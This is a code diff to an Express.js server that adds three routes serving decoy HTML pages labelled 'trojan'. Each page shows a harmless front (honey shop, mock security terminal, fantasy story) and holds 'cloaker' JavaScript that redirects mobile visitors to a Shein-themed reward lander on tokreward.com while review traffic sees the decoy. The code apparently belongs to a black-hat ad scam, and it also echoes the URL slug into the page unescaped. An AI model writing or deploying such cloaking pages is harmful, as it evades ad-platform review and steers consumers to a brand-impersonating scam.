@@ -17,6 +17,280 @@ app.use(express.static(path.join(__dirname, 'public')));
 // ALEXI 5.0
 
 // SHEIN BH FLUENT
+app.get('/87610/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/sheinesp.html?slug=876`;
+    const trojanHTML = `
+       <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        // Cloaker logic
+        const urlParams = new URLSearchParams(window.location.search);
+        const utmXXX = urlParams.get("xxx");
+        const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        if (utmXXX === "__PLACEMENT__") {
+            } else if (isMobileDevice) {
+                window.location.href = "https://tokreward.com/shein.html?slug=876";
+            } else {
+            }
+    </script>
+    <title>${slug}</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: 'Lato', sans-serif;
+            background-color: #f0e68c;
+            color: #333;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        header {
+            background-color: #daa520;
+            color: white;
+            text-align: center;
+            padding: 2em 0;
+            border-bottom: 5px solid #cd853f;
+        }
+        .honey-products {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            margin-top: 2em;
+        }
+        .product {
+            background-color: #fff8dc;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 1.5em;
+            margin-bottom: 1.5em;
+            width: calc(33% - 1em);
+        }
+        footer {
+            background-color: #cd853f;
+            color: white;
+            text-align: center;
+            padding: 1em;
+            margin-top: 2em;
+        }
+        footer a {
+            color: #fffacd;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>${slug}'s Honey Haven</h1>
+    </header>
+    <div class="container">
+        <div class="honey-products">
+            <div class="product">
+                <h2>Wildflower Honey</h2>
+                <p>${slug}'s signature blend, bursting with the flavors of local wildflowers. A taste of nature in every spoonful.</p>
+            </div>
+            <div class="product">
+                <h2>Lavender Infused Honey</h2>
+                <p>Our lavender honey is a ${slug} specialty, perfect for teas, desserts, or as a unique spread.</p>
+            </div>
+            <div class="product">
+                <h2>Raw Honeycomb</h2>
+                <p>Experience honey as nature intended with ${slug}'s raw honeycomb. A true delicacy for honey enthusiasts.</p>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <p>&copy; 2024 ${slug}'s Honey Haven | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served 876 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/9401/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/sheinesp.html?slug=940`;
+    const trojanHTML = `
+       <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        // Cloaker logic
+        const urlParams = new URLSearchParams(window.location.search);
+        const utmXXX = urlParams.get("xxx");
+        const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        if (utmXXX === "__PLACEMENT__") {
+            } else if (isMobileDevice) {
+                window.location.href = "https://tokreward.com/sheinesp.html?slug=940";
+            } else {
+            }
+    </script>
+    <title>${slug}</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: 'Courier New', monospace;
+            background-color: #000;
+            color: #00ff00;
+        }
+        .terminal {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            border: 1px solid #00ff00;
+        }
+        header {
+            border-bottom: 1px solid #00ff00;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+        .command {
+            margin-bottom: 10px;
+        }
+        .command::before {
+            content: "$ ";
+            color: #00ff00;
+        }
+        footer {
+            margin-top: 20px;
+            border-top: 1px solid #00ff00;
+            padding-top: 10px;
+        }
+        footer a {
+            color: #00ff00;
+        }
+    </style>
+</head>
+<body>
+    <div class="terminal">
+        <header>
+            <h1>${slug}'s Cybersecurity Terminal</h1>
+        </header>
+        <div class="command">cd /home/${slug}/security</div>
+        <div class="command">ls</div>
+        <p>firewall.sh&nbsp;&nbsp;&nbsp;intrusion_detection.py&nbsp;&nbsp;&nbsp;encryption_tools/</p>
+        <div class="command">./firewall.sh</div>
+        <p>Firewall activated. All ports secured.</p>
+        <div class="command">python3 intrusion_detection.py</div>
+        <p>Monitoring network traffic. No suspicious activity detected.</p>
+        <div class="command">cd encryption_tools && ./generate_keys.sh</div>
+        <p>New encryption keys generated successfully.</p>
+        <footer>
+            <p>&copy; 2024 ${slug}'s Cybersecurity Terminal | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+        </footer>
+    </div>
+</body>
+</html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served 876 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/9411/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/sheinesp.html?slug=941`;
+    const trojanHTML = `
+       <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        // Cloaker logic
+        const urlParams = new URLSearchParams(window.location.search);
+        const utmXXX = urlParams.get("xxx");
+        const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        if (utmXXX === "__PLACEMENT__") {
+            } else if (isMobileDevice) {
+                window.location.href = "https://tokreward.com/sheinesp.html?slug=941";
+            } else {
+            }
+    </script>
+    <title>${slug}</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: 'Georgia', serif;
+            background-color: #f5e6d3;
+            color: #4a4a4a;
+        }
+        .parchment {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 40px;
+            background-color: #fff9e6;
+            border: 2px solid #d2b48c;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        header {
+            text-align: center;
+            border-bottom: 2px solid #d2b48c;
+            padding-bottom: 20px;
+            margin-bottom: 20px;
+        }
+        .story-excerpt {
+            font-style: italic;
+            margin-bottom: 20px;
+        }
+        .chapter-list {
+            list-style-type: none;
+            padding: 0;
+        }
+        .chapter-list li {
+            margin-bottom: 10px;
+        }
+        footer {
+            text-align: center;
+            margin-top: 20px;
+            border-top: 2px solid #d2b48c;
+            padding-top: 20px;
+        }
+        footer a {
+            color: #8b4513;
+        }
+    </style>
+</head>
+<body>
+    <div class="parchment">
+        <header>
+            <h1>${slug}'s Epic Tale</h1>
+        </header>
+        <div class="story-excerpt">
+            <p>"In the land of ${slug}, where magic flowed like rivers and dreams took flight on the wings of dragons, a young hero embarked on a quest that would change the fate of the realm forever..."</p>
+        </div>
+        <h2>Chapters</h2>
+        <ul class="chapter-list">
+            <li>Chapter 1: The Call of Destiny</li>
+            <li>Chapter 2: Shadows in the Forest</li>
+            <li>Chapter 3: The ${slug} Prophecy</li>
+            <li>Chapter 4: Allies and Adversaries</li>
+            <li>Chapter 5: The Tower of Illusions</li>
+        </ul>
+        <footer>
+            <p>&copy; 2024 ${slug}'s Epic Tale | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+        </footer>
+    </div>
+</body>
+</html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served 876 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
 app.get('/90510/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://tokreward.com/shein.html?slug=905`;
